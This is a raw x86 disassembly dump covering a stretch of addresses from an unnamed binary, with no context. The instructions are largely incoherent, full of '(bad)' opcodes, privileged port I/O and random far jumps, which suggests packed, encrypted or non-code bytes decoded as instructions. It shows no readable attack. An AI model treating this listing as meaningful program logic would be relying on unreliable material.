  4198b4:	loop   0x41992a
  4198b6:	push   ds
  4198b7:	test   DWORD PTR [ecx],eax
  4198b9:	mov    al,ds:0xc55a255b
  4198be:	scas   ax,WORD PTR es:[edi]
  4198c0:	mov    ah,0xca
  4198c2:	int3   
  4198c3:	rcl    BYTE PTR [eax],cl
  4198c5:	pop    ebx
  4198c6:	or     DWORD PTR [edi+0x44f6bac2],eax
  4198cc:	fist   DWORD PTR [esi+0x3dbe0307]
  4198d2:	sub    DWORD PTR [ecx+0x10],edi
  4198d5:	push   edx
  4198d6:	xchg   ecx,eax
  4198d7:	call   0xcf4d39cf
  4198dc:	mov    al,ds:0x8aee5f31
  4198e1:	daa    
  4198e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4198e3:	mov    al,0xf3
  4198e5:	das    
  4198e6:	(bad)  
  4198e8:	lods   eax,DWORD PTR ds:[esi]
  4198e9:	inc    eax
  4198ea:	leave  
  4198eb:	scas   eax,DWORD PTR es:[edi]
  4198ec:	das    
  4198ed:	sbb    bh,BYTE PTR ds:[ebx+0x312536f6]
  4198f4:	fs mov dh,0x77
  4198f7:	xor    DWORD PTR [edx+0x2f4869be],edi
  4198fd:	aam    0x3e
  4198ff:	pusha  
  419900:	cmp    ch,BYTE PTR [ebx-0x7a5cde86]
  419906:	in     eax,0xc2
  419908:	test   ah,dl
  41990a:	nop
  41990b:	popf   
  41990c:	inc    edx
  41990d:	shl    BYTE PTR [ebx-0x7e],0x5a
  419911:	out    dx,al
  419912:	jbe    0x41997a
  419914:	sbb    BYTE PTR [esi-0x73],cl
  419917:	push   ebx
  419918:	sbb    al,0x8
  41991a:	mov    WORD PTR [edi+edi*1+0x69],gs
  41991e:	inc    ebp
  41991f:	retf   
  419920:	jno    0x419930
  419922:	jo     0x41995a
  419924:	xchg   ebx,eax
  419925:	jecxz  0x419993
  419927:	xchg   BYTE PTR [bp+di],bh
  41992a:	imul   ebx,DWORD PTR ds:0x3ca8b550,0x46
  419931:	cmp    eax,DWORD PTR [ebp+0x5577cb68]
  419937:	fbstp  TBYTE PTR [ebp+0x3a]
  41993a:	pop    es
  41993b:	jne    0x419939
  41993d:	dec    ebx
  41993e:	sub    dh,dl
  419940:	lods   al,BYTE PTR ds:[esi]
  419941:	outs   dx,DWORD PTR ds:[esi]
  419942:	pop    esi
  419943:	jecxz  0x419904
  419945:	push   ebp
  419946:	inc    ebx
  419947:	cwde   
  419948:	icebp  
  419949:	xchg   edx,eax
  41994a:	loop   0x4198e6
  41994c:	or     eax,0x9da3a215
  419951:	mov    ebx,0x56084910
  419956:	push   ecx
  419957:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419958:	stos   BYTE PTR es:[edi],al
  419959:	jge    0x419986
  41995b:	cmp    edi,DWORD PTR [ebx]
  41995d:	and    BYTE PTR [ecx+0x9c4fd4e],ch
  419963:	sbb    BYTE PTR [ebx+0xdfcc1f6],bh
  419969:	sbb    DWORD PTR gs:[eax],0xac129dd1
  419970:	xchg   ebx,eax
  419971:	inc    edi
  419972:	loop   0x4198fa
  419974:	xchg   esi,eax
  419975:	call   0x8658ef40
  41997a:	xchg   esi,eax
  41997b:	idiv   ah
  41997d:	adc    ecx,ecx
  41997f:	dec    ecx
  419980:	mov    eax,0x4576e4e6
  419985:	fstp   DWORD PTR [ebx-0x22]
  419988:	xchg   bl,ah
  41998a:	popf   
  41998b:	fucomp st(4)
  41998d:	fsub   st(1),st
  41998f:	cwde   
  419990:	icebp  
  419991:	cmp    DWORD PTR [eax],0x2ac5051a
  419997:	in     al,0x71
  419999:	jae    0x419a0e
  41999b:	jecxz  0x41992c
  41999d:	dec    esi
  41999e:	jnp    0x41998c
  4199a0:	ror    BYTE PTR [edi-0x77b3c62d],1
  4199a6:	sbb    eax,0x1876711e
  4199ab:	push   0x68
  4199ad:	sti    
  4199ae:	xchg   esp,eax
  4199af:	cmovg  eax,DWORD PTR [ebx-0x3454c658]
  4199b6:	pop    ecx
  4199b7:	retf   0xdbe3
  4199ba:	mov    ebx,0x717406af
  4199bf:	push   esp
  4199c0:	push   esi
  4199c1:	dec    esp
  4199c2:	cld    
  4199c3:	shr    BYTE PTR [eax],0xf9
  4199c6:	and    DWORD PTR [ebx-0xdca9a8c],edx
  4199cc:	sahf   
  4199cd:	xlat   BYTE PTR ds:[ebx]
  4199ce:	test   BYTE PTR [ecx+0x1a],0x7
  4199d2:	mov    ch,0x23
  4199d4:	mov    ecx,0xe6b155bb
  4199d9:	dec    ecx
  4199da:	outs   dx,DWORD PTR ds:[esi]
  4199db:	inc    ebp
  4199dc:	jno    0x41998e
  4199de:	dec    ecx
  4199e0:	and    al,0xfd
  4199e2:	mov    eax,0xb241bc81
  4199e7:	push   eax
  4199e8:	mov    al,ds:0x83e0c7f1
  4199ed:	call   0x4356:0x2c2ee7e0
  4199f4:	adc    eax,0x42c85853
  4199f9:	mov    dl,0xce
  4199fb:	xchg   edi,eax
  4199fc:	pop    ss
  4199fd:	out    dx,al
  4199fe:	push   ebp
  4199ff:	dec    ecx
  419a00:	xor    eax,0xa47b2ec4
  419a05:	scas   al,BYTE PTR es:[edi]
  419a06:	ret    
  419a07:	and    ecx,DWORD PTR [eax+0x14c4fea3]
  419a0d:	jle    0x419a67
  419a0f:	cmp    eax,0x1231501
  419a14:	lods   eax,DWORD PTR ds:[esi]
  419a15:	dec    esp
  419a16:	lahf   
  419a17:	xchg   esi,eax
  419a18:	push   cs
  419a19:	std    
  419a1a:	clc    
  419a1b:	sub    BYTE PTR [esi+eiz*2-0x7c],dh
  419a1f:	push   esi
  419a20:	jno    0x419a41
  419a22:	ins    DWORD PTR es:[edi],dx
  419a23:	sbb    DWORD PTR [ebx+0x9],0xa53b3b46
  419a2a:	pop    es
  419a2b:	ins    DWORD PTR es:[edi],dx
  419a2c:	test   ebx,edi
  419a2e:	rol    BYTE PTR [edx],cl
  419a30:	cdq    
  419a31:	mov    cl,dh
  419a33:	fwait
  419a34:	(bad)  
  419a35:	mov    esp,0x49d79cbe
  419a3a:	ja     0x419a39
  419a3c:	dec    esi
  419a3d:	retf   0xa869
  419a40:	xlat   BYTE PTR ds:[ebx]
  419a41:	rcr    esp,0xa
  419a44:	scas   al,BYTE PTR es:[edi]
  419a45:	data16 cmp al,0xb3
  419a48:	out    dx,eax
  419a49:	pushf  
  419a4a:	test   eax,0x806c46d1
  419a4f:	fs rol cl,0x3e
  419a53:	test   DWORD PTR [eax],esp
  419a55:	hlt    
  419a56:	(bad)  
  419a57:	mov    esp,0x2e55adba
  419a5c:	sbb    DWORD PTR [ecx],ecx
  419a5e:	outs   dx,DWORD PTR ds:[esi]
  419a5f:	(bad)  
  419a60:	mov    eax,ds:0x6f2794bc
  419a65:	xor    BYTE PTR [ebx],0x49
  419a68:	sub    eax,0xeaecc480
  419a6d:	pop    ss
  419a6e:	(bad)  
  419a6f:	test   BYTE PTR [ecx+0x2df3c5ba],0xaf
  419a76:	int    0x0
  419a78:	and    ch,BYTE PTR [eax+0x403fa629]
  419a7e:	fs fsubrp st(5),st
  419a81:	jne    0x419aea
  419a83:	loope  0x419aef
  419a85:	xor    eax,0xc3a550bc
  419a8a:	(bad)  
  419a8b:	(bad)  
  419a8c:	sub    ebx,DWORD PTR [ecx-0x28]
  419a8f:	sbb    eax,0x866560cd
  419a94:	xchg   edx,eax
  419a95:	int3   
  419a96:	jbe    0x419a54
  419a98:	sbb    al,0x8a
  419a9a:	xchg   ebx,eax
  419a9b:	dec    edi
  419a9c:	dec    edi
  419a9d:	pop    ecx
  419a9e:	cwde   
  419a9f:	pushf  
  419aa0:	loop   0x419af6
  419aa2:	in     eax,dx
  419aa3:	push   edx
  419aa4:	lock loop 0x419aca
  419aa7:	clc    
  419aa8:	mov    dl,0xf5
  419aaa:	test   BYTE PTR [ebp+0x50],ah
  419aad:	adc    DWORD PTR [ebp+0x2b4440b2],ebp
  419ab3:	xor    DWORD PTR [eax+0xc],ebx
  419ab6:	mov    dh,0xa7
  419ab8:	das    
  419ab9:	loop   0x419a4b
  419abb:	aam    0xaa
  419abd:	scas   eax,DWORD PTR es:[edi]
  419abe:	cmp    al,0x38
  419ac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419ac1:	loope  0x419ab4
  419ac3:	shl    BYTE PTR [ebx],cl
  419ac5:	mov    esp,0x145426dc
  419aca:	inc    edx
  419acb:	je     0x419a4f
  419acd:	enter  0x9f05,0x7d
  419ad1:	imul   eax,DWORD PTR [edx+0x4a],0xf01074e2
  419ad8:	push   ss
  419ad9:	cli    
  419ada:	out    dx,al
  419adb:	jecxz  0x419b5b
  419add:	xor    DWORD PTR [ecx],esp
  419adf:	aad    0xbf
  419ae1:	sti    
  419ae2:	(bad)
  419ae6:	xor    eax,ebp
  419ae8:	data16 (bad) 
  419aea:	push   ebx
  419aeb:	add    eax,DWORD PTR [edi+0x12]
  419aee:	pushf  
  419aef:	mov    ch,BYTE PTR [ebp-0x27]
  419af2:	mov    eax,0xff2adc53
  419af7:	dec    edx
  419af8:	sbb    bh,BYTE PTR [edx]
  419afa:	dec    eax
  419afb:	dec    ebp
  419afc:	mov    ch,0x26
  419afe:	mov    ds:0x88f8d742,eax
  419b03:	inc    esp
  419b04:	inc    ebp
  419b05:	xor    ecx,ebx
  419b07:	xchg   edx,eax
  419b08:	xchg   edx,eax
  419b09:	lahf   
  419b0a:	pop    ebp
  419b0b:	retf   
  419b0c:	cmp    eax,0x5bace7d8
  419b11:	cmp    esi,edx
  419b13:	xor    DWORD PTR [ebx+0x586373e0],edi
  419b19:	mov    bh,0x4d
  419b1b:	je     0x419b14
  419b1d:	pop    ebp
  419b1e:	call   0x94b1c926
  419b23:	mov    bl,0xc4
  419b25:	jp     0x419ab0
  419b27:	imul   ecx,DWORD PTR [esi+0x4bf3bf0b],0xffffff8e
  419b2e:	sub    DWORD PTR [ebp-0x2b4b5dc2],edx
  419b34:	cmp    al,0x8f
  419b36:	dec    esp
  419b37:	(bad)  
  419b38:	jno    0x419b76
  419b3a:	adc    DWORD PTR [edi],eax
  419b3c:	dec    ebx
  419b3d:	aam    0x5a
  419b3f:	or     eax,0xc6774d6
  419b44:	adc    DWORD PTR [edi],ebx
  419b46:	dec    ebp
  419b47:	sbb    DWORD PTR [ecx+0x4f],edi
  419b4a:	dec    ebp
  419b4b:	push   0xffffff8d
  419b4d:	rcl    BYTE PTR [ebx+0x2b],cl
  419b50:	mov    al,ds:0x46e86d38
  419b55:	jno    0xc7d65a7b
  419b5b:	jg     0x419b63
  419b5d:	cmp    ecx,ecx
  419b5f:	rcl    BYTE PTR [ecx+eiz*4+0x5dd23934],1
  419b66:	cld    
  419b67:	aam    0xee
  419b69:	add    esi,DWORD PTR [ebp-0x13]
  419b6c:	xlat   BYTE PTR ds:[ebx]
  419b6d:	and    al,BYTE PTR [edx]
  419b6f:	sub    ebx,esi
  419b71:	pop    eax
  419b72:	test   DWORD PTR [esi],esi
  419b74:	sbb    esp,ecx
  419b76:	nop
  419b77:	popf   
  419b78:	xor    BYTE PTR [eax+0x46],bh
  419b7b:	xor    edi,DWORD PTR [esi]
  419b7d:	xor    cl,BYTE PTR [eax]
  419b7f:	pop    esi
  419b80:	cmp    al,ah
  419b82:	lds    esi,FWORD PTR [eax-0x2d666c98]
  419b88:	mov    ecx,0x638a5ef9
  419b8d:	out    0x79,al
  419b8f:	ds (bad) 
  419b91:	rcl    BYTE PTR [ebp+0x454519ff],0xd8
  419b98:	int3   
  419b99:	xchg   esi,eax
  419b9a:	jg     0x419c11
  419b9c:	test   dl,cl
  419b9e:	and    dh,bh
  419ba0:	mov    DWORD PTR [ebx+0x2b],eax
  419ba3:	and    DWORD PTR [esi],0xf5535ecc
  419ba9:	and    al,0x33
  419bab:	mov    ds:0xb6c6f98b,al
  419bb0:	and    DWORD PTR [ebx],0xfffffff2
  419bb3:	add    eax,0x220eb808
  419bb8:	cwde   
  419bb9:	das    
  419bba:	push   0x28
  419bbc:	add    esi,DWORD PTR [edi-0x57]
  419bbf:	fisubr DWORD PTR [ebx+0x46]
  419bc2:	pop    es
  419bc3:	(bad)  
  419bc4:	mov    esi,0x13d44285
  419bc9:	or     al,0x1c
  419bcb:	mov    BYTE PTR [edx+edi*8+0x16],ah
  419bcf:	leave  
  419bd0:	jnp    0x419b6a
  419bd2:	pop    ss
  419bd3:	std    
  419bd4:	xor    ah,al
  419bd6:	ret    0xa0a3
  419bd9:	mov    dl,0xc2
  419bdb:	mov    al,ds:0xcf9b764b
  419be0:	xor    al,0xe2
  419be2:	out    dx,eax
  419be3:	pusha  
  419be4:	mov    bh,0x92
  419be6:	or     al,0x36
  419be8:	push   0x4
  419bea:	or     eax,0x4eb41412
  419bef:	sar    al,1
  419bf1:	lds    esp,FWORD PTR [ebx+ecx*8+0x70]
  419bf5:	pop    ebp
  419bf6:	sti    
  419bf7:	shr    DWORD PTR ds:0xc496a72a,1
  419bfe:	sbb    ecx,0xf
  419c01:	dec    ecx
  419c02:	test   BYTE PTR [ebx+0x5e],bh
  419c05:	iret   
  419c06:	sub    BYTE PTR ds:0x98b81d6a,dh
  419c0c:	bound  esi,QWORD PTR [ecx-0x37ad8c58]
  419c12:	call   0x80d0:0x43e2fe6b
  419c19:	sti    
  419c1a:	scas   al,BYTE PTR es:[edi]
  419c1b:	icebp  
  419c1c:	(bad)  
  419c1d:	(bad)  
  419c1e:	mov    edx,0xae69d89
  419c23:	lods   eax,DWORD PTR ds:[esi]
  419c24:	gs add ebx,esp
  419c27:	imul   ebp,DWORD PTR [esp+ebx*4+0x25095265],0x2719420e
  419c32:	clc    
  419c33:	(bad)  
  419c34:	test   BYTE PTR [ebx],ah
  419c36:	push   ebp
  419c37:	arpl   WORD PTR [eax],di
  419c39:	dec    edi
  419c3a:	pop    eax
  419c3b:	lods   al,BYTE PTR ds:[esi]
  419c3c:	xchg   esp,eax
  419c3d:	vdivss xmm6,xmm5,DWORD PTR ds:0x29fe90af
  419c45:	sbb    bl,BYTE PTR [edi]
  419c47:	mov    edx,0xadbf6390
  419c4c:	adc    ch,BYTE PTR [ebp+0x33]
  419c4f:	retf   0xc620
  419c52:	out    dx,al
  419c53:	dec    edx
  419c54:	adc    DWORD PTR ds:0x9652249b,0xffffffac
  419c5b:	aaa    
  419c5c:	outs   dx,DWORD PTR ds:[esi]
  419c5d:	mov    al,ds:0xbf0a909c
  419c62:	ret    
  419c63:	pextrw ebx,(bad),0xc5
  419c65:	fisttp WORD PTR [edx+ebx*8-0x10066c33]
  419c6d:	sbb    eax,DWORD PTR [ecx]
  419c6f:	add    eax,0xc964d50b
  419c74:	mov    ?,WORD PTR [edx]
  419c76:	dec    ecx
  419c77:	sbb    cl,BYTE PTR [edi+0x3d74a24a]
  419c7d:	jmp    0xd81f:0xee41f741
  419c84:	stos   DWORD PTR es:[edi],eax
  419c85:	or     eax,0x39ee6bdd
  419c8a:	sub    esp,ebp
  419c8c:	add    BYTE PTR [edi],0x37
  419c8f:	shl    bl,cl
  419c91:	push   ebp
  419c92:	call   0xbccf5462
  419c97:	add    cl,BYTE PTR [edi]
  419c99:	es sub al,0x6
  419c9c:	ret    
  419c9d:	imul   ebp,DWORD PTR [ebp-0x2d],0x70c8cd90
  419ca4:	cmp    BYTE PTR fs:[edx-0x5b322a65],cl
  419cab:	xchg   ah,dh
  419cad:	inc    ecx
  419cae:	dec    edi
  419caf:	shl    DWORD PTR [esi-0x71],1
  419cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419cb3:	bound  ebx,QWORD PTR [ebx]
  419cb5:	mov    bl,0x7b
  419cb7:	xchg   esp,eax
  419cb8:	repnz mov ebx,0x5af7c6ff
  419cbe:	scas   al,BYTE PTR es:[edi]
  419cbf:	jl     0x419d3a
  419cc1:	push   ebx
  419cc2:	outs   dx,DWORD PTR ds:[esi]
  419cc3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419cc4:	mov    DWORD PTR [esi-0x19313aba],esi
  419cca:	(bad)  
  419ccb:	sub    ebp,ebp
  419ccd:	nop
  419cce:	cmp    bh,BYTE PTR [edx+0x9]
  419cd1:	test   BYTE PTR [eax+0x5721eb18],0x5c
  419cd8:	push   ecx
  419cd9:	aaa    
  419cda:	rol    BYTE PTR [ebx-0x11bd89ac],cl
  419ce0:	add    dl,dh
  419ce2:	sub    BYTE PTR [edi+0x2526be78],0x3
  419ce9:	add    DWORD PTR [ebx],eax
  419ceb:	sub    edx,esp
  419ced:	mov    cl,0x84
  419cef:	mov    edx,0x6727c9ee
  419cf4:	mov    edi,fs
  419cf6:	rcr    esi,0x89
  419cf9:	sti    
  419cfa:	inc    esi
  419cfb:	push   esp
  419cfc:	stc    
  419cfd:	popa   
  419cfe:	(bad)  
  419cff:	rcl    ebp,1
  419d01:	and    ah,BYTE PTR [ecx]
  419d03:	xchg   edi,eax
  419d04:	xor    DWORD PTR [ebx+0x2b],ebp
  419d07:	fist   WORD PTR [edx+eiz*8]
  419d0a:	xchg   esp,eax
  419d0b:	sub    ebx,esp
  419d0d:	mov    dl,0xad
  419d0f:	add    ecx,DWORD PTR [ecx-0x3f]
  419d12:	js     0x419d7c
  419d14:	pop    ds
  419d15:	or     ebx,DWORD PTR [edx+0x1f]
  419d18:	add    eax,0x875f324b
  419d1d:	mov    ah,0x43
  419d1f:	jb     0x419cf1
  419d21:	sbb    DWORD PTR [edx-0x51058ffd],esp
  419d27:	xchg   ebx,eax
  419d28:	xor    dl,dl
  419d2a:	xchg   ebx,eax
  419d2b:	in     eax,0xf
  419d2d:	mov    esi,edi
  419d2f:	scas   eax,DWORD PTR es:[edi]
  419d30:	push   ds
  419d31:	hlt    
  419d32:	(bad)  
  419d34:	xor    eax,DWORD PTR [ecx-0x5a]
  419d37:	cmp    al,0xa
  419d39:	pop    eax
  419d3a:	mov    edi,0x677900d4
  419d3f:	repnz pop ebx
  419d41:	adc    eax,0x9484cc27
  419d46:	xor    dh,BYTE PTR [ecx+eax*8]
  419d49:	push   es
  419d4a:	(bad)  
  419d4b:	and    esi,DWORD PTR [esi-0x28]
  419d4e:	inc    edi
  419d4f:	or     DWORD PTR [ecx],0xffffff97
  419d52:	sbb    BYTE PTR [edi-0x24ef262b],ah
  419d58:	adc    dh,BYTE PTR [eax]
  419d5a:	cmp    eax,0x79204fcf
  419d5f:	adc    edi,DWORD PTR [esi+0x60aef899]
  419d65:	dec    ecx
  419d66:	int    0x7f
  419d68:	adc    eax,0x8aa58b7e
  419d6d:	dec    esi
  419d6e:	fnsave [ebx-0x411bc9c]
  419d74:	sbb    ebx,DWORD PTR [eax+esi*2]
  419d77:	mov    edx,0xbf99b44f
  419d7c:	outs   dx,BYTE PTR ds:[esi]
  419d7d:	sbb    esp,esp
  419d7f:	adc    eax,0x66539b2
  419d84:	push   eax
  419d85:	cli    
  419d86:	pop    esp
  419d87:	test   al,0x3
  419d89:	mov    ds:0x999e873e,eax
  419d8e:	add    ecx,0xce0407c8
  419d94:	jb     0x419dfe
  419d96:	or     esi,ebp
  419d98:	mov    WORD PTR [esi+0x24],ss
  419d9b:	xchg   edx,eax
  419d9c:	mov    BYTE PTR [ecx],dl
  419d9e:	jmp    0xcb89:0xbd5d5069
  419da5:	(bad)  
  419da6:	sbb    al,0x28
  419da8:	bound  eax,QWORD PTR [esp+ebx*1]
  419dab:	and    BYTE PTR [ebp-0x40],0x6c
  419daf:	sub    bh,al
  419db1:	outs   dx,DWORD PTR ds:[esi]
  419db2:	push   ebp
  419db3:	xor    ah,dl
  419db5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419db6:	adc    BYTE PTR [ebp+0x1e],dh
  419db9:	mov    esp,0x42c14f1d
  419dbe:	mov    dl,0xb3
  419dc0:	xchg   ebp,eax
  419dc1:	mov    cl,0x64
  419dc3:	shl    ah,0x45
  419dc6:	nop
  419dc7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419dc8:	pop    edi
  419dc9:	icebp  
  419dca:	dec    ebp
  419dcb:	(bad)  
  419dcc:	stos   DWORD PTR es:[edi],eax
  419dcd:	pop    es
  419dce:	cmp    DWORD PTR [esi-0x151bd9ef],0x17
  419dd5:	pop    ebx
  419dd6:	rcl    edx,0x80
  419dd9:	mov    DWORD PTR [ebp-0x633a17fc],eax
  419ddf:	sbb    DWORD PTR [ebp+0xc],eax
  419de2:	push   esp
  419de3:	je     0x419dc0
  419de5:	mov    ebp,0x2ab8deb9
  419dea:	pop    esi
  419deb:	sbb    al,0x7a
  419ded:	pop    ebp
  419dee:	inc    ebp
  419def:	jmp    0x57e3f071
  419df4:	test   DWORD PTR [esi+0x7c],ebp
  419df7:	xchg   ebx,eax
  419df8:	ins    BYTE PTR es:[edi],dx
  419df9:	jbe    0x419de3
  419dfb:	xchg   edx,eax
  419dfc:	lods   al,BYTE PTR ds:[esi]
  419dfd:	inc    esi
  419dfe:	cmp    esi,DWORD PTR [edx]
  419e00:	pop    edi
  419e01:	jmp    0x2ad9:0xc517df39
  419e08:	xchg   BYTE PTR [ebp-0x52fe68a3],bl
  419e0e:	lds    esp,FWORD PTR gs:[ebx]
  419e11:	mov    bl,BYTE PTR [ebp+0x57]
  419e14:	retf   
  419e15:	shl    BYTE PTR [esi-0x41df7265],0x99
  419e1c:	or     al,BYTE PTR gs:[ebp-0x383ba0c4]
  419e23:	call   0x7f59526b
  419e28:	std    
  419e29:	or     esp,DWORD PTR [ecx-0x6c]
  419e2c:	mov    ebx,0x95aca577
  419e31:	mov    al,ds:0xbc82cfaf
  419e36:	or     BYTE PTR [ebp+0x37],cl
  419e39:	xor    ah,BYTE PTR [ecx+0x3c]
  419e3c:	jmp    0x36fa:0x5c49a47e
  419e43:	xor    eax,0xeb64771d
  419e48:	adc    al,0x80
  419e4a:	cmp    DWORD PTR [bx-0x6210],edi
  419e4f:	and    BYTE PTR [ebp+0x58743b9f],bl
  419e55:	pusha  
  419e56:	enter  0x9f26,0x9a
  419e5a:	mov    ah,0xaa
  419e5c:	jo     0x419e51
  419e5e:	(bad)  
  419e5f:	enter  0x27c0,0xad
  419e63:	add    ch,dh
  419e65:	sbb    eax,0x25c7e0be
  419e6a:	jp     0x419e1a
  419e6c:	retf   0x1ac2
  419e6f:	outs   dx,BYTE PTR ds:[esi]
  419e70:	push   esp
  419e71:	(bad)  
  419e72:	adc    esp,DWORD PTR [edx-0x1e]
  419e75:	adc    dl,BYTE PTR [ecx+0x4a]
  419e78:	and    DWORD PTR [esi-0x38a242c3],edi
  419e7e:	das    
  419e7f:	inc    esp
  419e80:	sub    DWORD PTR [eax-0x7e2a48e8],ebx
  419e86:	inc    eax
  419e87:	in     eax,dx
  419e88:	push   es
  419e89:	pop    ebp
  419e8a:	in     eax,dx
  419e8b:	test   DWORD PTR [edi+0x58d27d29],ebx
  419e91:	out    0xef,eax
  419e93:	int    0x71
  419e95:	vpsrlq ymm5,ymm3,XMMWORD PTR [ecx]
  419e99:	mov    ecx,0x487afd67
  419e9e:	cwde   
  419e9f:	or     eax,0x1f255cc5
  419ea4:	outs   dx,DWORD PTR ds:[esi]
  419ea5:	ret    0xb483
  419ea8:	adc    DWORD PTR [eax-0xe],0x38
  419eac:	loop   0x419ee7
  419eae:	xchg   ecx,eax
  419eaf:	inc    edi
  419eb0:	pop    esp
  419eb1:	(bad)  
  419eb2:	and    esi,ebp
  419eb4:	clc    
  419eb5:	jno    0x419efe
  419eb7:	sahf   
  419eb8:	dec    ebp
  419eb9:	fs inc edx
  419ebb:	int    0x31
  419ebd:	push   edx
  419ebe:	ror    BYTE PTR [esi-0xfb927cb],1
  419ec4:	fucom  st(7)
  419ec6:	sbb    ch,BYTE PTR [ebx+0x50]
  419ec9:	add    BYTE PTR [edi],bl
  419ecb:	aas    
  419ecc:	(bad)  
  419ecd:	xchg   edi,eax
  419ece:	pop    ecx
  419ecf:	rol    DWORD PTR [edx+0x7849ed4b],0x35
  419ed6:	pop    eax
  419ed7:	xchg   ebx,eax
  419ed8:	add    al,0xd3
  419eda:	nop    DWORD PTR [edi-0x18]
  419ede:	imul   edx,ebx,0x54ab4186
  419ee4:	lock adc al,0x68
  419ee7:	or     eax,0x45bebe17
  419eec:	enter  0x779d,0x72
  419ef0:	pop    esp
  419ef1:	mov    dl,0x5a
  419ef3:	xrelease xchg DWORD PTR [edi+0x5f],ecx
  419ef7:	stos   BYTE PTR es:[edi],al
  419ef8:	add    al,0x57
  419efa:	shr    DWORD PTR [ebp-0xa],cl
  419efd:	scas   eax,DWORD PTR es:[edi]
  419efe:	and    edx,ebp
  419f00:	xor    eax,0xa7613c33
  419f05:	popf   
  419f06:	sbb    DWORD PTR ds:0xa584e9ad,0xf4265bfb
  419f10:	pop    ss
  419f11:	sbb    BYTE PTR [edi-0x17c99230],dl
  419f17:	push   ss
  419f18:	icebp  
  419f19:	retf   0x2a9
  419f1c:	aam    0xc0
  419f1e:	push   0x2a
  419f20:	xchg   esp,eax
  419f21:	mov    ds:0x61114f83,al
  419f26:	inc    eax
  419f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f28:	push   edi
  419f29:	jns    0x419fa4
  419f2b:	cmp    eax,0xb80c256
  419f30:	jne    0x419f45
  419f32:	xchg   ebx,eax
  419f33:	push   esp
  419f34:	scas   eax,DWORD PTR es:[edi]
  419f35:	dec    eax
  419f36:	push   0x77e7490c
  419f3b:	(bad)  
  419f3c:	mov    DWORD PTR [esp+ebp*4+0x28],0xca30f656
  419f44:	sbb    al,0xc
  419f46:	mov    al,0xe2
  419f48:	sub    DWORD PTR [edx+edx*2-0x293ce21],ecx
  419f4f:	cmp    ecx,edi
  419f51:	sbb    eax,0xf138488f
  419f56:	bound  edi,QWORD PTR [edi+eax*4]
  419f59:	xchg   ecx,eax
  419f5a:	inc    esi
  419f5b:	adc    edi,edi
  419f5d:	mov    ebx,?
  419f5f:	fs inc ecx
  419f61:	fcomp  DWORD PTR [eax]
  419f63:	xchg   edi,eax
  419f64:	inc    ecx
  419f65:	mov    esi,0x5bbc78b3
  419f6a:	lods   al,BYTE PTR ds:[esi]
  419f6b:	inc    edx
  419f6c:	fs out dx,al
  419f6e:	add    BYTE PTR [ebx+edx*4-0x2be43c93],al
  419f75:	pop    eax
  419f76:	dec    eax
  419f77:	jge    0x419fea
  419f79:	jmp    0x159a:0x9f6b907b
  419f80:	cmp    edi,ebx
  419f82:	cld    
  419f83:	outs   dx,DWORD PTR ds:[esi]
  419f84:	and    BYTE PTR [ebp-0x12d8b375],cl
  419f8a:	fst    DWORD PTR [eax]
  419f8c:	jb     0x419fe4
  419f8e:	xchg   DWORD PTR [edx],edi
  419f90:	aas    
  419f91:	ror    al,0x4d
  419f94:	mov    dl,al
  419f96:	sbb    esp,eax
  419f98:	pop    ecx
  419f99:	shl    DWORD PTR [edx-0x5ec38990],cl
  419f9f:	xchg   ecx,eax
  419fa0:	inc    ecx
  419fa1:	push   es
  419fa2:	inc    esi
  419fa3:	clc    
  419fa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419fa5:	adc    BYTE PTR [ebp+ebp*1+0x3],dh
  419fa9:	sbb    DWORD PTR [eax-0x1],0x9
  419fad:	pop    es
  419fae:	dec    ebx
  419faf:	add    eax,0x14929d86
  419fb4:	retf   
  419fb5:	xor    eax,0xe981965
  419fba:	in     al,0x4
  419fbc:	sbb    bh,0x6a
  419fbf:	sti    
  419fc0:	(bad)  
  419fc1:	test   eax,0x9c2ab954
  419fc6:	mov    ebx,0x8088bf26
  419fcb:	(bad)  
  419fcc:	xor    al,0x86
  419fce:	jg     0x41a00a
  419fd0:	mov    ah,0xab
  419fd2:	pop    eax
  419fd3:	mov    edi,0x19b48e88
  419fd8:	fdivr  st,st(6)
  419fda:	mov    eax,ds:0xebd6ae8a
  419fdf:	fs mov dl,0xab
  419fe2:	retf   
  419fe3:	pushf  
  419fe4:	and    edi,DWORD PTR [ebp+ecx*2+0x1b]
  419fe8:	pop    ebx
  419fe9:	jge    0x41a00c
  419feb:	push   esp
  419fec:	xor    al,0x58
  419fee:	lea    ebx,[ecx-0x3f]
  419ff1:	cmp    al,0x8a
  419ff3:	gs push ebx
  419ff5:	js     0x41a06e
  419ff7:	outs   dx,BYTE PTR ds:[esi]
  419ff8:	call   0xf10:0x54b73e29
  419fff:	add    dh,dh
  41a001:	push   0x67
  41a003:	and    edi,ebx
  41a005:	je     0x41a06b
  41a007:	stc    
  41a008:	push   0xffffffc9
  41a00a:	in     eax,0x38
  41a00c:	js     0x419f97
  41a00e:	loopne 0x419ff1
  41a010:	xlat   BYTE PTR ds:[ebx]
  41a011:	jmp    0xa596:0xbe2d3c32
  41a018:	xor    esp,edi
  41a01a:	inc    ebx
  41a01b:	pusha  
  41a01c:	jbe    0x419ffd
  41a01e:	cmp    al,0xdc
  41a020:	je     0x419fd5
  41a022:	jl     0x419ffd
  41a024:	or     DWORD PTR [ecx+0x11082423],esi
  41a02a:	cmp    eax,0xbcaddfa9
  41a02f:	sub    al,0xd1
  41a031:	aas    
  41a032:	rcl    BYTE PTR [esi-0x383698a4],cl
  41a038:	inc    edi
  41a039:	adc    BYTE PTR [ebx],cl
  41a03b:	int3   
  41a03c:	xchg   edi,eax
  41a03d:	aas    
  41a03e:	inc    ecx
  41a03f:	cld    
  41a040:	mov    bl,0x3e
  41a042:	inc    edx
  41a043:	xchg   edi,eax
  41a044:	gs sahf 
  41a046:	or     edi,esi
  41a048:	sar    BYTE PTR [esi-0x3de689ca],1
  41a04e:	mov    eax,ds:0xde11453b
  41a053:	mov    ebx,0x3ea8ec62
  41a058:	mov    ebx,0xdea377a8
  41a05d:	ins    DWORD PTR es:[edi],dx
  41a05e:	das    
